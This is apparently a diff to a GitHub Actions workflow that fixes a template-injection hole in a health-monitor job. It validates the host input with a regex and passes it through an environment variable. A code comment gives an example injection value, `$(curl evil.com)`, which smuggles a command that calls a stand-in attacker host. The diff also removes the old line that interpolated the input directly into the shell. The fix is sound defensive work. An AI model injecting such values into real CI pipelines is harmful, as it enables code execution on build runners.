@@ -16,9 +16,33 @@ permissions:
 jobs:
   monitor:
     runs-on: ubuntu-latest
+    env:
+      HOST_REGEX: '^(https?://[a-zA-Z0-9]([a-zA-Z0-9\\-]{0,61}[a-zA-Z0-9])?([a-zA-Z0-9\\-\\.]*[a-zA-Z0-9])?(:\d+)?(/[a-zA-Z0-9\\-_\.\/]*)?)$'
     steps:
       - uses: actions/checkout@v4
       - uses: actions/setup-python@v5
         with:
           python-version: '3.11'
-      - run: python3 scripts/health_monitor.py --host '${{ github.event.inputs.host }}' --repo ${{ github.repository }}
+      # Validate: the host input must match a safe URL pattern.
+      # Gating here prevents template-injection (issue #406): a malicious
+      # value like `$(curl evil.com)` is rejected before reaching the shell.
+      - name: validate-host
+        run: |
+          if ! python3 -c "
+          import os, re, sys
+          host = os.environ.get('HOST_INPUT', '')
+          pattern = os.environ['HOST_REGEX']
+          if not re.match(pattern, host):
+              print('ERROR: host no válido — posible inyección de template')
+              sys.exit(1)
+          print(f'host válido: {host}')
+          "; then
+            exit 1
+          fi
+        env:
+          HOST_INPUT: ${{ github.event.inputs.host }}
+      # Safe: host is validated above, passed as env var (not interpolated in shell).
+      - name: run-health-check
+        run: python3 scripts/health_monitor.py --host "$HEALTH_HOST" --repo ${{ github.repository }}
+        env:
+          HEALTH_HOST: ${{ github.event.inputs.host }}
